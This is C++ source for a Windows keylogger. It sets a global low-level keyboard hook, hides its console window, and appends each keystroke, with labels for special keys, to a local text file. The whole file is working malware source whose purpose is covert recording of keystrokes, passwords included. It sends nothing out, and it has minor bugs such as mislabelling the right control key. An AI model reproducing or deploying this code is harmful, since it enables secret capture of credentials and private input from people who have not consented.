#define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
#define VIRTUAL_KEY_CODE key->vkCode
#include <iostream>
#include <Windows.h>
#include <fstream>
HHOOK keyboardHook;
void hide();
void show();
void saveToFile(DWORD key);
LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int main()
{
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, NULL);
	hide();
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
	{
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
	}
}

void saveToFile(DWORD key)
{
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
	{
		exit(0);
	}
	else if (key == VK_ESCAPE)
	{
		exit(1);
		UnhookWindowsHookEx(keyboardHook);
	}
	else if (key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	else if (key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key == VK_DELETE)
		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
	else if (key == VK_LCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
	else if (key == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
	else if (key == VK_LSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
	else if (key == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
	else if (key == VK_CAPITAL)
	{
		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK ON]");
		else
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK OFF]");
	}
	else if (key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
	else if (key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
	else
		fprintf(OUTPUT_FILE, "%s", &key);
	fclose(OUTPUT_FILE);
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
			VIRTUAL_KEY_CODE = char(tolower(VIRTUAL_KEY_CODE));
		saveToFile(VIRTUAL_KEY_CODE);
				
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void hide()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void show()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}